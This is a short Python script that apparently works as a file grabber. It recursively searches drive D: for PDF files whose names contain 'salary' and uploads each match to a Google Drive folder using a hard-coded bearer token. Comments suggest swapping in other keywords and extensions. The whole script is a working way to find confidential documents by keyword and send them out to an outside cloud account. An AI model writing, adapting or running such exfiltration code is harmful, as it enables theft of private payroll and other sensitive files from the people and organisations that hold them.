import os
import json
import requests

def upload_file_to_drive(file_path, file_name):
    headers = {
        "Authorization": "Bearer #you token"
    }

    para = {
        "name": file_name,
        "parents": [""] #Your Folder ID in Drive
    }

    files = {
        'data': ('metadata', json.dumps(para), 'application/json;charset=UTF-8'),
        'file': open(file_path, 'rb')
    }

    response = requests.post("https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
                             headers=headers,
                             files=files)

    if response.status_code == 200:
        return True
    else:
        return False


for root, dirs, files in os.walk('D:/'): #Drive D only 
    for file in files:
        if file.endswith('.pdf') and 'salary' in file.lower(): #You can add keyword present in filename of your choice and also the extention of file
            file_path = os.path.join(root, file)
            file_path = file_path.replace("\\","/")
            if upload_file_to_drive(file_path,file):
                print(f"filename: {file} sent")



